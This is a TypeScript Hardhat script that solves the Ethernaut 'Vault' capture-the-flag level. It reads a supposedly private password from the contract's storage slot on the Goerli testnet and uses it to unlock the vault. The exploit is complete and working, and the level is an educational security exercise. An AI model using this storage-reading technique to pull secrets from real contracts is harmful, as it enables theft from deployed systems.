import { ethers } from "hardhat";

const attackVault = async () => {
    // change contract addresses here.
    const vaultAddress = process.env.VAULT!; //type "await contract.address()" in ethernaut console

    // Don't touch below 🚀
    // Vulnerability comes from storage could be read and making it private does not stop this.
    // Additional read to understand more on reading storage:
    // https://docs.soliditylang.org/en/v0.8.10/internals/layout_in_storage.html
    // https://web3js.readthedocs.io/en/v1.5.2/web3-eth.html#getstorageat
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            constant: undefined,
            inputs: [{ internalType: "bytes32", name: "_password", type: "bytes32" }],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "constructor",
        },
        {
            constant: true,
            inputs: [],
            name: "locked",
            outputs: [{ internalType: "bool", name: "", type: "bool" }],
            payable: undefined,
            stateMutability: "view",
            type: "function",
        },
        {
            constant: undefined,
            inputs: [{ internalType: "bytes32", name: "_password", type: "bytes32" }],
            name: "unlock",
            outputs: [],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, vaultAddress);
    console.log("Checking vault is locked..");
    let locked = await contract.locked();
    console.log(`Vault contract is locked: ${locked}`);
    console.log("Reading password from storage...");
    const provider = ethers.getDefaultProvider("goerli");
    const password = await provider.getStorageAt(vaultAddress, 1);
    console.log(`Password is: ${password}`);
    console.log("Unlocking with password...");
    const unlocking = await contract.unlock(password);
    const receipt = await unlocking.wait();
    console.log(receipt);
    console.log("Now checking is success...");
    locked = await contract.locked();
    console.log(`Vault contract is locked: ${locked}`);
    if (!locked) {
        console.log("Congrats, Level Passed!Vault contract unlocked. Submit to ethernaut.");
    } else {
        console.log("Vault still locked. Review code above and try again...");
    }
};

attackVault()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
